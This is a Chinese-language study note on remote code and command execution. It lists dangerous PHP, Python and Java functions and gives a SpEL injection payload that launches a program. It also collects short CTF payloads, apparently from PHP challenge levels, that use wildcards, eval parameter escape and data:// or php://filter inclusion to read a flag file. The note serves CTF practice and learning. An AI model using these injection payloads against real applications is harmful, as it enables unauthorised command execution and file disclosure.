
-RCE代码执行：引用脚本代码解析执行
-RCE命令执行：脚本调用操作系统命令

## 漏洞函数

php:

代码执行

```
eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等
```

命令执行

```
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
```

python:

```
eval exec subprocess os.system commands
```

Java:

Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.

## 利用点举例

- 代码执行
- 命令执行

## RCE-Java&PHP

SPEL：（功能点举例：评论解析）

```
comment=T(java.lang.Runtime).getRuntime().exec('calc')
```

## 其他漏洞引发链

注入，文件包含，文件上传，反序列化等引发

## CTF

```
29-通配符

system('tac fla*.php');

30-取代函数&通配符&管道符

`cp fla*.ph* 2.txt`;

echo shell_exec('tac fla*.ph*');

31-参数逃逸

eval($_GET[1]);&1=system('tac flag.php');

32~36-配合包含&伪协议

include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>

include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

37~39-包含RCE&伪协议&通配符

data://text/plain,<?php system('tac fla*');?>

php://input post:<?php system('tac flag.php');?>
```